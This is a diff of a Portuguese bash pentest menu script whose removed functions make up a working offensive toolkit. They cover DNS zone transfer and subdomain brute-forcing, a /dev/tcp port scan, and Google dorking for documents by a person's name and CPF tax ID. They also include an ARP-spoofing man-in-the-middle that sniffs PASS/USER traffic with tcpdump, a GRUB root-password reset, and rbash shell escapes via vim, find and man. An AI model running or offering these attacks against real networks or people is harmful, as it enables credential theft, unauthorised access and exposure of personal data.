@@ -875,1289 +875,1289 @@
         main_menu
     }
 
-#! TODO: UPDATE ALL BELOW
-# Define a função v_dns_zt para realizar uma transferência de zona DNS
-function v_dns_zt(){
-    echo "DNS Zone Transfer"
-    echo "Digite a URL do alvo"
-    read -r TARGET
-    
-    # Obter servidores de nomes para o domínio especificado
-    NS_SERVERS=$(host -t ns "$TARGET" | awk '{print $4}')
-    
-    # Iterar sobre os servidores de nomes e listar os registros de zona de autoridade
-    for SERVER in $NS_SERVERS; do
-        host -l -a "$TARGET" "$SERVER"
-    done
-    
-    # Aguarda o usuário pressionar Enter para continuar
-    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-    read -r 2> /dev/null
-    
-    main_menu; # Retorna ao menu principal
-}
-# Define a função vi_Subdomain_takeover para realizar um ataque de Subdomain Takeover
-function vi_Subdomain_takeover(){
-    # Solicita ao usuário o host para o ataque
-    echo "Digite o host para o ataque de Subdomain takeover"
-    read -r HOST
-    
-    # Solicita ao usuário o arquivo contendo os domínios a serem testados
-    echo "Aponte para o arquivo com os domínios a serem testados."
-    read -r FILE
-    
-    # Define o comando a ser usado para verificar os CNAME dos subdomínios
-    COMMAND="host -t cname"
-    
-    # Itera sobre cada palavra no arquivo de domínios e executa o comando de verificação
-    for WORD in $($FILE); do
-        $COMMAND "$WORD"."$HOST" | grep "alias for"
-    done
-    
-    # Aguarda o usuário pressionar Enter para continuar
-    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-    read -r 2> /dev/null
-    
-    main_menu; # Retorna ao menu principal
-}
-# Define a função vii_rev_dns para realizar uma pesquisa de DNS reverso
-function vii_rev_dns(){
-    echo "Dns Reverse"
-    
-    # Solicita ao usuário o endereço para a pesquisa de DNS reverso
-    echo "Insira o endereço para o DNS REVERSE"
-    read -r ADDRESS
-    
-    # Solicita ao usuário o início do intervalo de endereços IP
-    echo "Digite o início do intervalo de endereços IP"
-    read -r START
-    
-    # Solicita ao usuário o fim do intervalo de endereços IP
-    echo "Digite o fim do intervalo de endereços IP"
-    read -r END
-    
-    # Define o nome do arquivo de saída
-    OUTPUT="$ADDRESS.$START-$END.txt"
-    
-    # Remove o arquivo de saída se existir e cria um novo
-    rm -rf "$OUTPUT"
-    touch "$OUTPUT"
-    
-    # Itera sobre os endereços IP no intervalo especificado e realiza a pesquisa de DNS reverso
-    for RANGE in $(seq "$START" "$END"); do
-        # Usa o comando host para obter o registro PTR e extrai o nome do host
-        host -t ptr "$ADDRESS"."$RANGE" | cut -d ' ' -f5 | grep -v '.ip-' >> "$OUTPUT"
-    done
-    
-    # Exibe o conteúdo do arquivo de saída
-    cat "$OUTPUT"
-    
-    # Aguarda o usuário pressionar Enter para continuar
-    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-    read -r 2> /dev/null
-    
-    main_menu; # Retorna ao menu principal
-}
-# Define a função viii_recon_dns para realizar uma reconhecimento de DNS
-function viii_recon_dns(){
-    # Conta o total de linhas no arquivo de lista de subdomínios
-    TOTAL_LINHAS=$(wc -l /usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt|awk '{print $1}')
-    
-    echo "DNS recon"
-    
-    # Solicita ao usuário o endereço para o DNS RECON
-    echo "Insira o endereço para o DNS RECON (EX: businesscorp.com.br)"
-    read -r DOMAIN
-    
-    # Inicializa a contagem de linha
-    linha=0
-    
-    # Itera sobre cada subdomínio na lista de subdomínios
-    # shellcheck disable=SC2013
-    for SUBDOMAIN in $(cat /usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt); do
-        # shellcheck disable=SC2219
-        let linha++ # Incrementa o contador de linha
+#! TODO: UPDATE ALL BELOW HERE. The main objective is translate to english and if necessary, refactor.
+    # Define a função v_dns_zt para realizar uma transferência de zona DNS
+    function v_dns_zt(){
+        echo "DNS Zone Transfer"
+        echo "Digite a URL do alvo"
+        read -r TARGET
         
-        # Realiza uma pesquisa de DNS para o subdomínio atual e salva no arquivo dns_recon_$DOMAIN.txt
-        host "$SUBDOMAIN"."$DOMAIN" >> dns_recon_"$DOMAIN".txt
+        # Obter servidores de nomes para o domínio especificado
+        NS_SERVERS=$(host -t ns "$TARGET" | awk '{print $4}')
         
-        # Exibe o progresso da pesquisa
-        echo "--------PESQUISANDO---------> $linha/$TOTAL_LINHAS"
-    done 
-    
-    # Aguarda o usuário pressionar Enter para continuar
-    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-    read -r 2> /dev/null
-    
-    main_menu; # Retorna ao menu principal
-}
-# Define a função ix_consulta_geral_google para realizar uma consulta geral no Google
-function ix_consulta_geral_google(){
-    echo "Consulta Geral Google" # Exibe mensagem indicando o início da consulta
-    
-    # Define as variáveis
-    #FIREFOX_SEARCH="firefox &"
-    LYNX_SEARCH="lynx -dump -hiddenlinks=merge -force_html"
-    LISTA=./amanda2csv.csv
-    
-    # Define a função para aguardar a entrada do usuário
-    function waitingUser() {
-        read -r "Pressione Enter para continuar..."
-    }
-    
-    # Define a função para realizar a consulta geral no Google
-    function consulta_geral_google (){
-        # Itera sobre cada linha no arquivo de lista de consultas
-        while IFS= read -r LINHA; do
-            local NOME
-            NOME="$(echo "$LINHA" |awk -F, '{print $1}')" # Extrai o nome da linha
-            local CPF
-            CPF="$(echo "$LINHA" |awk -F, '{print $2}')"   # Extrai o CPF da linha
-            
-            # Exibe a mensagem indicando a pesquisa atual
-            echo "==="
-            echo "Pesquisando:""$NOME"+"$CPF"
-            
-            # Realiza a pesquisa no Google usando lynx e filtra os resultados
-            $LYNX_SEARCH "https://www.google.com/search?q=intext:$NOME+intext:$CPF" | grep -i '\.pdf' | cut -d '=' -f2 | grep -v 'x-raw-image' | sed 's/...$//' | grep -E -i "(HTTPS|HTTP)"
-            
-            waitingUser # Aguarda o usuário pressionar Enter para continuar com a próxima pesquisa
-        done < "$LISTA" # Redireciona o arquivo de lista de consultas para a entrada do loop
-        echo "============ fim da consulta ===========" # Indica o fim da consulta
-    }
-    
-    # Chama a função para realizar a consulta geral no Google
-    consulta_geral_google
-    
-    # Aguarda o usuário pressionar Enter para continuar
-    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-    read -r 2> /dev/null
-    
-    main_menu; # Retorna ao menu principal
-}
-# Define a função x_mitm para realizar um ataque de Man-in-the-Middle (MiTM)
-function x_mitm(){
-    ########### VARIAVEIS ##############
-    # Obtém o nome da interface de rede que começa com 'tap'.
-    INTERFACE=$(ip -br a | grep tap | head -n 1 | cut -d ' ' -f1)
-    # Calcula a rede da interface obtida anteriormente.
-    REDE=$(ipcalc "$(ip -br a | grep tap | head -n 1 | awk '{print $3}'|awk -F '/' '{print $1}')"|grep -F "Network:"|awk '{print $2}')
-    
-    ########### FUNÇÕES ##############
-    # Limpa a tela e exibe informações sobre a interface e a rede de ataque.
-    function mensagem_inicial (){
-        clear
-        echo "============= 0.0wL ============="
-        echo "INTERFACE DO ATAQUE: $INTERFACE"
-        echo "REDE DO ATAQUE: $REDE"
-        echo "================================="
-    }
-    
-    # Habilita o roteamento de pacotes no sistema.
-    function habilitar_roteamento_pc (){
-        echo 1 > /proc/sys/net/ipv4/ip_forward
-        echo "================================="
-        echo "ROTEAMENTO DE PACOTES HABILITADO"
-        echo "================================="
-    }
-    
-    # Configura o ambiente para spoofing e captura de pacotes.
-    function estrutura_mitm (){
-        macchanger -r "$INTERFACE";  # Altera o endereço MAC da interface para fins de spoofing
-        #wireshark -i "$INTERFACE" -k >/dev/null 2>&1 & # Inicia o Wireshark para captura de pacotes em segundo plano #TODO:REATIVAR WIRESHARK 
-        tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $REDE" & \  # Inicia o Netdiscover em uma nova sessão do Tilix #FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 628:  : command not found
-        sleep 10  # Espera por 10 segundos
-        echo -n "Digite o IP do ALV01: "  # Solicita o IP do alvo 1
-        read -r ALV01  # Lê o IP do alvo 1
-        echo -n "Digite o IP do ALV02: "  # Solicita o IP do alvo 2
-        read -r ALV02  # Lê o IP do alvo 2
-        tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $ALV01 -r $ALV02" & \  # Inicia o Arpspoof em uma nova sessão do Tilix #FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 634:  : command not found
-        #clear  # Limpa a tela
-        #open a new konsole session with arpspoof
-        tcpdump -i "$INTERFACE" -t host "$ALV01" and host "$ALV02" | grep -E '\[P.\]' | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' | tee capturas.txt #todo: add mais ext aos filtros com regex '  # Inicia o Tcpdump para captura de pacotes entre os alvos
-    }
-    
-    # Função principal para execução do ataque MiTM
-    function main_mitm (){
-        mensagem_inicial;  # Chama a função mensagem_inicial.'
-        habilitar_roteamento_pc;  # Chama a função habilitar_roteamento_pc.'
-        estrutura_mitm;  # Chama a função estrutura_mitm.'
-        echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-        read -r 2> /dev/null
-        main_menu
-    }
-    
-    ########### MAIN ##############
-    main_mitm;
-
-}
-# Portscan usando bashsocket
-function xi_portscan_bashsocket(){
-    # Script retirado do livro Cybersecurity Ops with bash e modificado para as minhas necessidades
-    #
-    # Descrição:
-    # Executa um portscan em um determinado host
-    #
-
-    echo -n "Insira o alvo para o portscan (ex: 192.168.9.5): "
-    read -r host_alvo
-    printf 'Alvo -> %s - Porta(s): ' "$host_alvo"  # Imprime o prefixo antes do loop
-
-    # Usar uma variável para armazenar as portas encontradas
-    portas_encontradas=""
-
-    # Loop para verificar portas abertas
-    for ((porta=1; porta<1024; porta++)); do
-        cat >/dev/null 2>&1 < /dev/tcp/"${host_alvo}"/"${porta}"
-        # shellcheck disable=SC2181
-        if (($? == 0)); then 
-            portas_encontradas+=" $porta"  # Adiciona a porta à lista de portas encontradas
-        fi
-    done 
-
-    # Imprime a lista de portas encontradas
-    echo "Portas abertas em $host_alvo: $portas_encontradas"
-    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-    read -r 2> /dev/null
-    main_menu;
-}
-# Define a função xii_comandos_uteis_linux para explicar sobre comandos úteis no linux
-function xii_comandos_uteis_linux(){
-  # limpa a tela
-  clear
-
-  # exibe um cabeçalho
-  echo
-  echo ">>>>>>>>>> COMANDOS LINUX <<<<<<<<<<"
-  echo
-
-  # exibe uma seção com comandos para gerenciamento de rede
-  echo -e "${RED}# Comandos uteis na gerencia de redes${RESET}"
-  echo
-
-  # exibe a sintaxe básica para os comandos
-  echo "Sintaxe -> comando (suite)"
-  echo
-
-  ### Listar tabela ARP
-
-  # exibe a seção para o comando arp
-  echo -e "${RED}## Listar tabela ARP${RESET}"
-  echo
-
-  # mostra como usar o comando arp (Net-tools & IP route) para listar a tabela ARP
-  echo "arp -a (Net-tools & IP route)"
-  echo
-
-  ### Exibir IPs configurados
-
-  # exibe a seção para os comandos ifconfig e ip addr
-  echo -e "${RED}## Exibir Ips configurados${RESET}"
-  echo
-
-  # mostra como usar o comando ifconfig (Net-tools) para exibir IPs configurados
-  echo "ifconfig -a (Net-tools)"
-
-  # mostra como usar o comando ip addr (IP route) para exibir IPs configurados
-  echo "ip addr (IP route)"
-  echo
-
-  ### Ativar/Desativar uma interface
-
-  # exibe a seção para os comandos ifconfig e ip link
-  echo -e "${RED}## Ativar/Desativar uma interface${RESET}"
-  echo
-
-  # mostra como usar o comando ifconfig eth0 up/down (Net-tools) para ativar/desativar a interface eth0
-  echo "ifconfig eth0 up/down (Net-tools)"
-
-  # mostra como usar o comando ip link set eth0 up/down (IP route) para ativar/desativar a interface eth0
-  echo "ip link set eth0 up/down (IP route)"
-
-  # observação sobre a interface eth0
-  echo -e "${GRAY}ps: eth0 refere-se a sua interface de rede. Para saber qual as suas interfaces, execute um dos comandos em 'Exibir Ips configurados'${RESET}"
-  echo
-
-  ### Exibir conexões ativas
-
-  # exibe a seção para os comandos netstat e ss
-  echo -e "${RED}## Exibe conexões ativas${RESET}"
-  echo
-
-  # mostra como usar o comando netstat (Net-tools) para exibir conexões ativas
-  echo "netstat (Net-tools)"
-
-  # mostra como usar o comando ss (IP route) para exibir conexões ativas
-  echo "ss (IP route)"
-
-  # observação sobre o comando ss para detectar shells indesejadas
-  echo -e "${GRAY}ps: para (talvez) saber se o chineizinho tem uma shell no seu computador, execute o comando 'ss -lntp'${RESET}"
-  echo
-
-  ### Exibir Rotas
-
-  # exibe a seção para os comandos route e ip route
-  echo -e "${RED}## Exibe Rotas${RESET}"
-  echo
-
-  # mostra como usar o comando route (Net-tools) para exibir rotas
-  echo "route (Net-tools)"
-
-  # mostra como usar o comando ip route (IP route) para exibir rotas
-  echo "ip route (IP route)"
-  echo
-
-  # exibe uma seção com informações sobre configurações de placa de rede
-  echo -e "${RED}# Configurações de Placa de Rede${RESET}"
-  echo
-
-  ### Configurações de rede em Debian
-
-  # explica como configurar a rede de forma persistente em sistemas derivados do Debian
-  echo -e "Nos sistemas derivados do ${RED}Debian${RESET}, a configuração persistente de rede é feita no arquivo ${RED}/etc/network/interfaces${RESET}"
-  echo
-
-  ### Configurações de rede em Red Hat Linux
-
-  # explica como configurar a rede de forma persistente em sistemas derivados do Red Hat Linux
-  echo -e "Nos sistemas derivados do ${RED}Red Hat Linux${RESET}, a configuração persistente de rede é configurada nos arquivos encontrados no diretório ${RED}/etc/sysconfig/network-scripts${RESET}"
-  echo
-
-  # pausa o script até que o usuário pressione ENTER
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  # chama a função main_menu para retornar ao menu principal
-  main_menu;
-}
-# Define a função xiii_exemplos_find para explicar sobre o comando find
-function xiii_exemplos_find(){
-  # limpa a tela
-  clear
-
-  # exibe um cabeçalho
-  echo
-  echo ">>>>>>>>>> COMANDOS LINUX - FIND & SEUS EXEMPLOS <<<<<<<<<<"
-  echo
-
-  ### Listar todos os arquivos em um diretório
-
-  # exibe a descrição e o comando para listar todos os arquivos em um diretório
-  echo -e "${RED}# exibe uma lista com todos os arquivos localizados em um determinado diretório, incluindo os arquivos armazenados nos subdiretórios.${RESET}"
-  echo -e "$ find ."
-  echo
-
-  ### Buscar por arquivos com maxdepth
-
-  # exibe a descrição e o comando para buscar por arquivos com um nível máximo de subdiretórios (maxdepth)
-  echo -e "${RED}# Condição que define o nível de 'profundidade' na navegação dos subdiretórios por meio do maxdepth.${RESET}"
-  echo -e "$ find /etc -maxdepth 1 -name *.sh"
-  echo
-
-  ### Buscar por arquivos com nome específico
-
-  # exibe a descrição e o comando para buscar por arquivos com nome específico usando curingas
-  echo -e "${RED}# Pesquisa por arquivos${RESET}"
-  echo -e "$ find ./test -type f -name <arquivo*>"
-  echo
-
-  ### Buscar por diretórios com nome específico
-
-  # exibe a descrição e o comando para buscar por diretórios com nome específico usando curingas
-  echo -e "${RED}# Pesquisa por diretórios${RESET}"
-  echo -e "$ find ./test -type d -name <diretorio*>"
-  echo
-
-  ### Buscar por arquivos ocultos
-
-  # exibe a descrição e o comando para buscar por arquivos ocultos
-  echo -e "${RED}# Pesquisa por arquivos ocultos${RESET}"
-  echo -e "$ find ~ -type f -name ".*""
-  echo
-
-  ### Buscar por arquivos com permissões específicas
-
-  # exibe a descrição e o comando para buscar por arquivos com permissões específicas
-  echo -e "${RED}# Pesquisa por arquivos com determinadas permissões${RESET}"
-  echo -e "# find / -type f -perm 0740 -type f -exec ls -la {} 2>/dev/null \;"
-  echo
-  echo -e "${RED}# Pesquisa por arquivos com permissões SUID${RESET}"
-  echo -e "# find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;"
-  echo
-
-
-  ### Buscar por arquivos do usuário específico
-
-  # exibe a descrição e o comando para buscar por arquivos do usuário específico
-  echo -e "${RED}# Pesquisa por arquivos do usuário msfadmin${RESET}"
-  echo -e "$ find . –user msfadmin"
-  echo
-
-  ### Buscar por arquivos do usuário específico com extensão específica
-
-  # exibe a descrição e o comando para buscar por arquivos do usuário específico com extensão específica
-  echo -e "${RED}# Pesquisa por arquivos do usuário msfadmin de extensão .txt${RESET}"
-  echo -e "$ find . –user msfadmin –name ‘*.txt’"
-  echo
-
-  ### Buscar por arquivos do grupo específico
-
-  # exibe a descrição e o comando para buscar por arquivos do grupo específico
-  echo -e "${RED}# Pesquisa por arquivos do grupo adm${RESET}"
-  echo -e "# find . –group adm"
-  echo
-
-  ### Buscar por arquivos modificados há N dias
-
-  # exibe a descrição e o comando para buscar por arquivos modificados há N dias
-  echo -e "${RED}# Pesquisa por arquivos modificados a N dias${RESET}"
-  echo -e "find / -mtime 5"
-  echo
-
-  ### Buscar por arquivos acessados há N dias
-
-  # exibe a descrição e o comando para buscar por arquivos acessados há N dias
-  echo -e "${RED}# Pesquisa por arquivos acessados a N dias${RESET}"
-  echo -e "# find / -atime 5"
-  echo
-
-  ### Buscar e executar comando com arquivos encontrados
-
-  # exibe a descrição e o comando para buscar por arquivos e executar um comando com cada um deles
-  echo -e "${RED}# Realiza a busca e executa comando com entradas encontradas.${RESET}"
-  echo -e "# find / -name "*.pdf" -type f -exec ls -lah {} \;"
-  echo
-
-  # pausa o script até que o usuário pressione ENTER
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  # chama a função main_menu para retornar ao menu principal
-  main_menu;
-}
-# Define a função xiv_debian_memento_troca_senha_root para explicar sobre a troca de senha root no debian
-function xiv_debian_memento_troca_senha_root(){
-  # limpa a tela
-  clear
-
-  # exibe um cabeçalho informativo
-  echo
-  echo -e "${RED}### Redefinindo a senha de root em sistemas Operacionais Debian e derivados ###${RESET}"
-  echo
-
-  ### Passo 1: Reiniciar o computador
-
-  # instrui o usuário a reiniciar o computador alvo
-  echo -e " 1. ${RED}Reiniciar o computador alvo;${RESET}"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 2: Editar o menu do GRUB
-
-  # instrui o usuário a entrar no menu de edição do GRUB pressionando a tecla 'e'
-  echo -e " 2. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 3: Localizar e modificar a linha de comando
-
-  # instrui o usuário a localizar a linha que inicia com "linux boot..." e substituir "ro quiet" por "init=/bin/bash rw"
-  echo -e " 3. Procurar pela linha que inicia com ${RED}'linux boot…${RESET}', substituir ${RED}'ro quiet${RESET}' ao final dessa linha por ${RED}'init=/bin/bash rw'${RESET};"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 4: Salvar as alterações e inicializar o sistema
-
-  # instrui o usuário a salvar as alterações pressionando "Ctrl+x" e inicializar o sistema com os novos parâmetros
-  echo -e " 4. Pressione ${RED}'Ctrl+x'${RESET} para iniciar o sistema com os parâmetros alterados;"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 5: Definir a nova senha de root
-
-  # instrui o usuário a definir a nova senha de root após o sistema inicializar
-  echo -e " 5. Após a inicialização do sistema, execute ${RED}'passwd root'${RESET} e digite a nova senha."
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 6: Reinicializar o sistema
-
-  # instrui o usuário a reinicializar o sistema após definir a nova senha
-  echo -e " 6. Reinicialize o SO, utilize o comando: ${RED}'reboot -f'${RESET}"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Mensagem de confirmação
-
-  # exibe uma mensagem informando que a senha do root foi redefinida
-  echo
-  echo -e "${RED}### NESSE MOMENTO, SE DEU TUDO CERTO, VOCÊ POSSUI A SENHA DO ROOT USER ###${RESET}"
-  echo
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  # volta para o menu principal
-  main_menu;
-}
-# Define a função xiv_debian_memento_troca_senha_root para explicar sobre a troca de senha root no redhat
-function xv_redhat_memento_troca_senha_root(){
-  # limpa a tela
-  clear
-
-  # exibe um cabeçalho informativo
-  echo
-  echo -e "${RED}### Redefinindo a senha de root em sistemas Operacionais Red Hat e derivados ###${RESET}"
-  echo
-
-  ### Passo 1: Reiniciar o computador
-
-  # instrui o usuário a reiniciar o computador alvo
-  echo -e " 1. ${RED}Reiniciar o computador alvo${RESET}"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 2: Editar o menu do GRUB
-
-  # instrui o usuário a entrar no menu de edição do GRUB pressionando a tecla 'e'
-  echo -e " 2. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 3: Localizar e modificar a linha de comando no CentOS/Fedora
-
-  # instrui o usuário a localizar a linha que inicia com "linux16..." e substituir "rghb quiet LANG=en_US.UTF-8" por "init=/bin/bash rw" (para CentOS/Fedora)
-  echo -e " 3. Procurar pela linha que inicia com ${RED}'linux16...'${RESET}, substituir ${RED}'rghb quiet LANG=en_US.UTF-8${RESET} ao final dessa linha por ${RED}'init=/bin/bash rw'${RESET};"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 4: Salvar as alterações e inicializar o sistema
-
-  # instrui o usuário a salvar as alterações pressionando "Ctrl+x" e inicializar o sistema com os novos parâmetros
-  echo -e " 4. Pressione ${RED}'Ctrl\+x'${RESET} para iniciar o sistema com os parâmetros alterados;"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 5: Desabilitar o SELinux (somente CentOS/Fedora)
-
-  # informa ao usuário que o SELinux precisa ser desabilitado (apenas para CentOS/Fedora)
-  echo -e " 5. Após a inicialização do sistema, temos que desabilitar o SELinux. Para isso, edite o arquivo ${RED}'/etc/selinux/config'${RESET} e substitua a opção ${RED}'enforcing'${RESET} por ${RED}'disable'${RESET};"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 6: Reinicializar o sistema (somente CentOS/Fedora)
-
-  # instrui o usuário a reinicializar o sistema após desabilitar o SELinux (apenas para CentOS/Fedora)
-  echo -e " 6. Reinicialize o SO, utilize o comando: ${RED}'/sbin/halt –reboot \-f'${RESET}"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 7: Editar o menu do GRUB novamente (somente Rocky/Alma)
-
-  # informa ao usuário que o menu do GRUB precisa ser editado novamente (apenas para Rocky/Alma)
-  echo -e " 7. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"
-
-  # pausa o script até que o usuário pressione ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  ### Passo 8: Localizar e modificar a linha de comando no Rocky/Alma
-
-  # instrui o usuário a localizar a linha que inicia com "linux16..." e substituir "rghb quiet LANG=en
-}
-# Definição da função xvi_vim_memento
-function xvi_vim_memento(){
-  # Limpa a tela
-  clear
-
-  # Exibe cabeçalho do lembrete de uso do Vim
-  echo -e "${GREEN}============= LEMBRETE DE USO DO VIM =============${RESET}"
-  echo
-
-  # **Inserção de texto**
-  echo -e "${YELLOW}Inserção de texto:${RESET}"
-  echo -e "Pressione 'i' para entrar no modo de inserção."
-
-  # **Salvar e sair**
-  echo -e "\n${YELLOW}Salvar e sair:${RESET}"
-  echo -e "Pressione 'Esc' para sair do modo de inserção, então digite ':wq' para salvar e sair."
-
-  # **Sair sem salvar**
-  echo -e "\n${YELLOW}Sair sem salvar:${RESET}"
-  echo -e "Pressione 'Esc' para sair do modo de inserção, então digite ':q!' para sair sem salvar."
-
-  # **Movimentação pelo texto**
-  echo -e "\n${YELLOW}Movimentação pelo texto:${RESET}"
-  echo -e "Use as teclas de seta ou as teclas 'h', 'j', 'k' e 'l' para mover o cursor."
-
-  # **Excluir texto**
-  echo -e "\n${YELLOW}Excluir texto:${RESET}"
-  echo -e "Pressione 'x' para excluir o caractere sob o cursor."
-
-  # **Desfazer e refazer**
-  echo -e "\n${YELLOW}Desfazer e Refazer:${RESET}"
-  echo -e "Pressione 'u' para desfazer e 'Ctrl + r' para refazer."
-
-  # **Buscar e substituir**
-  echo -e "\n${YELLOW}Buscar e Substituir:${RESET}"
-  echo -e "Digite '/' para iniciar a busca. Para substituir, use ':s/palavra/nova_palavra/g'."
-
-  # **Ajuda**
-  echo -e "\n${YELLOW}Ajuda:${RESET}"
-  echo -e "Digite ':help' para obter ajuda."
-
-  # Exibe rodapé do lembrete de uso do Vim
-  echo -e "\n${GREEN}===================================================${RESET}"
-  echo
-
-  # Mensagem para pressionar ENTER para continuar
-  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-  read -r 2> /dev/null
-
-  # Chamada da função principal do menu principal após pressionar ENTER
-  main_menu;
-}
-# Definição da função principal xvii_tec_esc_rbash
-function xvii_tec_esc_rbash(){
-
-    # Definição da função vim_escape_rbash
-    function vim_escape_rbash(){
-        # Comando do Vim para escapar do rbash
-        local vim_comando="vim.tiny -E -c :\!/bin/sh"
-
-        # Verificar se o konsole está instalado
-        if command -v konsole &> /dev/null; then
-                # KDE (Konsole)
-                konsole --hold -e "${vim_comando}"
-        else
-            # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
-            if command -v gnome-terminal &> /dev/null; then
-                # Ubuntu (Gnome Terminal)
-                gnome-terminal -- "${vim_comando}"
-            elif command -v xfce4-terminal &> /dev/null; then
-                # Xubuntu (Xfce Terminal)
-                xfce4-terminal --execute "${vim_comando}"
-            elif command -v tilix &> /dev/null; then
-                # Tilix está instalado
-                tilix --action=app-new-window "${vim_comando}"
-            elif command -v xterm &> /dev/null; then
-                # Terminal genérico (xterm)
-                xterm -e "${vim_comando}"
-            else
-                # Nenhum terminal padrão encontrado
-                echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
-                exit 1
-            fi
-        fi
-    }
-
-    # Definição da função find_escape_rbash
-    function find_escape_rbash(){
-        # Comando find para escapar do rbash
-        local find_comando="find . -exec /bin/sh \; -quit"
-
-        # Verificar se o Tilix está instalado
-        if command -v tilix &> /dev/null; then
-            # Tilix está instalado, abrir uma nova sessão do Tilix
-            tilix --action=app-new-window "${find_comando}"
-        else
-            # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
-            if command -v gnome-terminal &> /dev/null; then
-                # Ubuntu (Gnome Terminal)
-                gnome-terminal -- "${find_comando}"
-            elif command -v xfce4-terminal &> /dev/null; then
-                # Xubuntu (Xfce Terminal)
-                xfce4-terminal --execute "${find_comando}"
-            elif command -v konsole &> /dev/null; then
-                # KDE (Konsole)
-                konsole --hold -e "${find_comando}"
-            elif command -v xterm &> /dev/null; then
-                # Terminal genérico (xterm)
-                xterm -e "${find_comando}"
-            else
-                # Nenhum terminal padrão encontrado
-                echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
-                exit 1
-            fi
-        fi
-    }
-
-    # Definição da função man_escape_rbash
-    function man_escape_rbash(){
-        # Comando man para escapar do rbash
-        local man_comando="echo 'Para escapar do rbash, logo apos o man iniciar, digite \!sh. Para continuar, aperte enter' && read && man man"
-
-        # Verificar se o Tilix está instalado
-        if command -v tilix &> /dev/null; then
-            # Tilix está instalado, abrir uma nova sessão do Tilix
-            tilix --action=app-new-window "${man_comando}"
-        else
-            # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
-            if command -v gnome-terminal &> /dev/null; then
-                # Ubuntu (Gnome Terminal)
-                gnome-terminal -- "${man_comando}"
-            elif command -v xfce4-terminal &> /dev/null; then
-                # Xubuntu (Xfce Terminal)
-                xfce4-terminal --execute "${man_comando}"
-            elif command -v konsole &> /dev/null; then
-                # KDE (Konsole)
-                konsole --hold -e "${man_comando}"
-            elif command -v xterm &> /dev/null; then
-                # Terminal genérico (xterm)
-                xterm -e "${man_comando}"
-            else
-                # Nenhum terminal padrão encontrado
-                echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
-                exit 1
-            fi
-        fi
-    }
-
-    # Definição da função verifica_comandos_instalados
-    function verifica_comandos_instalados () {
-        # Verificar se o Vim está instalado e acessível
-        if command -v vim &> /dev/null; then
-            # Executar função para escapar do rbash com Vim
-            vim_escape_rbash;
-        else
-            # Verificar se o Find está instalado e acessível
-            if command -v find &> /dev/null; then
-                # Executar função para escapar do rbash com Find
-                find_escape_rbash;
-            # Verificar se o Man está instalado e acessível
-            elif command -v man &> /dev/null; then
-                # Executar função para escapar do rbash com Man
-                man_escape_rbash;
-            else
-                # Nenhum dos comandos necessários está instalado
-                echo "O script não é capaz de sair do rbash"    
-            fi
-        fi   
-    }
-
